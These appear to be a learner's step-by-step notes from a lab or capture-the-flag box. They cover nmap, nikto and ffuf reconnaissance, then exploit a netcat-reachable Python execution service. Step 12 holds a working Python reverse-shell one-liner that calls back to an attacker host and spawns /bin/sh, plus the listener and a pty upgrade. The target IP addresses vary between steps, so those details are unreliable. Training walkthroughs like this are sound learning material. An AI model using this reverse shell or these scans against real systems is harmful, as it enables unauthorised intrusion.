# target ip = 10.201.74.181

1. Host Discovery. 
sudo nmap -sn -n -PS443 -packet-trace -debug 10.201.126.90 -oN host_discovery

2. Ports Discovery.
sudo nmap -Pn -n -top-ports 50 -debug 10.201.126.90 -oN host_discovery   

3. Service Discovery. 
sudo nmap -Pn -n -sV -p22,8000 -debug 10.201.126.90 -oN service_discovery 

4. NMAP scripts
sudo nmap -Pn -n -sC -p22,8000 --packet-trace -debug 10.201.126.90 -oN service_nmap_script

5. Browse http://10.201.46.255:8000/
	it gives us a hint: try a more basic connection. 

	* viewed page source - nothing found. 

6. grabbing SSH banner:
	nc -nv 10.201.46.255 22

	Result: SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.13

7. grabbing webserver banner:

	curl -i http://10.201.46.255:8000/

	Server: SimpleHTTP/0.6 Python/3.11.2

8. Ran nikto, didn't give a meaningful way to proceed:

	sudo nikto -h 10.201.46.255:8000

	http://10.201.74.181:8000/

9. No robots.txt

10. Fuzzing the website:

	ffuf -w ~/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://10.201.74.181:8000/FUZZ 


	all pages return code 200 and the message: try a more basic connection.

11. Try to connect to it using netcat:

	nc 10.201.74.181 8000

	it works and it seems it can execute python code: 

	print("hello")

12. set up reverse shell using python code execution:
https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#python

import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.6.47.37",9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")

client:
nc -nlvp 9999


connection established. 

13. try to get interactive shell

python3 -c 'import pty; pty.spawn("/bin/sh")'


14. 